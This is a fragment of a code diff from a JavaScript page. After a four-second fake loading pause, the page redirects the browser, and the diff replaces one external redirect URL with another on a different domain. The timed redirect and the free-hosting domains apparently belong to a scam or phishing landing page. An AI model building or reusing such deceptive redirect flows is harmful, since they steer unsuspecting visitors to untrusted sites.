@@ -131,7 +131,7 @@ function getcs(){
    audio1.load();   
 setTimeout(function(){  
     $("#process1").hide();   
-location.href='https://kuda-terbang.whf.bz/urlwa/v2ge3e';
+location.href='https://anjayhostjon.cloud/wa/v2ge3e';
  $('.load').hide();
     }, 4000);    
     
